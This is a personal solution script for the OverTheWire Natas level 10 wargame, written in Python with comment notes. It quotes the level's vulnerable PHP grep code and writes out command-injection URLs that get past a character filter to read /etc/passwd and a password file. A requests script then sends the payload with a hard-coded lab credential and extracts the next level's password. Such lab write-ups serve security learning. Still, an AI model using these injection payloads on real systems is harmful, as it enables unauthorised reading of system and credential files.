# Natas Level 9 → Level 10
# Username: natas10
# URL:      http://natas10.natas.labs.overthewire.org


# view source :

# For security reasons, we now filter on certain characters<br/><br/>
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>


# Output:
# <pre>
# <?
# $key = "";

# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }

# if($key != "") {
#     if(preg_match('/[;|&]/',$key)) {
#         print "Input contains an illegal character!";
#     } else {
#         passthru("grep -i $key dictionary.txt");
#     }
# }
# ?>
# </pre>

# ------------------------------
# need to understand this
# <?
# $key = "";

# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }

# if($key != "") {
#     if(preg_match('/[;|&]/',$key)) {
#         print "Input contains an illegal character!";
#     } else {
#         passthru("grep -i $key dictionary.txt");
#     }
# }
# ?>

# juist use + in place of ;,|,&
# http://natas10.natas.labs.overthewire.org/?needle=a%20+%20cat%20/etc/passwd&submit=Search

# http://natas10.natas.labs.overthewire.org/?needle=a%20+%20cat%20/etc/natas_webpass/natas11&submit=Search


import requests,re

auth_user="natas10"
auth_pass="t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"


# http://natas10.natas.labs.overthewire.org/?needle=a%20+%20cat%20/etc/natas_webpass/natas11&submit=Search
url="http://natas10.natas.labs.overthewire.org/?needle=a%20+%20cat%20/etc/natas_webpass/natas11&submit=Search"

resp=requests.get(url,auth=(auth_user,auth_pass))

text=resp.text.splitlines()[:30]
# print(text)

# had to specify the len caus ehtis time with pass we also have the dict output and the pwd who knows why 


# don't forget the regex 
# Character	Description	Example	Try it
# []	A set of characters	"[a-m]"	
# \	Signals a special sequence (can also be used to escape special characters)	"\d"	
# .	Any character (except newline character)	"he..o"	
# ^	Starts with	"^hello"	
# $	Ends with	"planet$"	
# *	Zero or more occurrences	"he.*o"	
# +	One or more occurrences	"he.+o"	
# ?	Zero or one occurrences	"he.?o"	
# {}	Exactly the specified number of occurrences	"he.{2}o"	
# |	Either or	"falls|stays"	
# ()	Capture and group


# pattern=re.compile(r'^natas11[A-Za-z0-9]{32}') // why is this not working ? // its not working cause it searches from strat and my string starts fromm /etc/ 
pattern=re.compile(r'natas11:([A-Za-z0-9]{32})')

m=pattern.findall(resp.text)
# print(m)

if m :
    print("Found password for natas11 : ",m[0])
else :
    print("No password for natas11 ")